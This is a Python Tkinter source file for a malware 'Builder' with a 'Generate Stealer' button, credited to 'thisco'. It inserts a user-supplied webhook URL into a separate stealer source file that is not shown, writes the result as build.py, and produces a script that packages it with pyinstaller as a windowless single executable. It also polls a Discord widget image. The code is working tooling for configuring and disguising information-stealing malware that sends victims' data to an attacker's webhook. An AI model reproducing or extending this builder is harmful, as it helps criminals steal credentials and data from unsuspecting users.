import tkinter as tk
from PIL import Image, ImageTk
import requests
from io import BytesIO
from tkinter import messagebox
import re
import os

class MainApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title('Builder')
        self.geometry('300x200')
        self.resizable(False, False)
        self.config(bg='#262020')

        self.webhook_entry = tk.Entry(self, width=30)
        self.webhook_entry.pack(pady=10)

        self.update_webhook_button = tk.Button(self, text='Generate Stealer', command=self.update_webhook)
        self.update_webhook_button.pack(pady=5)

        self.credits_label = tk.Label(self, text='Credits: Made by thisco', bg='#262020', fg='white', font=('Arial', 12))
        self.credits_label.pack(pady=5)

        self.discord_widget = tk.Label(self)
        self.discord_widget.pack(expand=True)

        self.update_discord_widget()

    def update_discord_widget(self):
        image_url = 'https://discord.c99.nl/widget/theme-3/1107490855788490762.png'
        response = requests.get(image_url)
        image_data = response.content

        image = Image.open(BytesIO(image_data))
        image = image.resize((250, 50), Image.LANCZOS)  # Use Image.LANCZOS for antialiasing

        self.image_photo = ImageTk.PhotoImage(image)  # Use self.image_photo instead of self.image_photo1
        self.discord_widget.configure(image=self.image_photo)
        self.discord_widget.image = self.image_photo

        self.after(3500, self.update_discord_widget)

    def update_webhook(self):
        webhook_url = self.webhook_entry.get()
        if not webhook_url:
            messagebox.showerror('Error', 'Webhook URL cannot be empty.')
            return

        if not webhook_url.startswith('http://') and not webhook_url.startswith('https://'):
            messagebox.showerror('Error', 'Invalid webhook URL. Please include "http://" or "https://".')
            return

        # Read the source code from the file
        file_path = os.path.join(os.path.dirname(__file__), 'src', 'src.py')
        with open(file_path, 'r', encoding='utf-8') as file:
            code = file.read()

        # Replace the webhook URL using regular expressions
        updated_code = re.sub(r'webhook_url = "(.*?)"', f'webhook_url = "{webhook_url}"', code)

        # Replace h00k with the provided webhook URL
        updated_code = re.sub(r'h00k = "(.*?)"', f'h00k = "{webhook_url}"', updated_code)

        # Write the updated code to a new file in the build folder
        build_folder = os.path.join(os.path.dirname(__file__), 'build')
        os.makedirs(build_folder, exist_ok=True)
        new_file_path = os.path.join(build_folder, 'build.py')
        with open(new_file_path, 'w', encoding='utf-8') as file:
            file.write(updated_code)

        # Write the compile script
        compile_script = '''import os
    os.system("pyinstaller --noconsole --onefile build.py")'''
        compile_script_path = os.path.join(build_folder, 'compile_to_exe.py')
        with open(compile_script_path, 'w', encoding='utf-8') as file:
            file.write(compile_script)

        messagebox.showinfo('Success', f'Set Webhook to: {webhook_url}')
        messagebox.showinfo('Success', f'Generated In {new_file_path}')


if __name__ == '__main__':
    app = MainApp()
    app.mainloop()
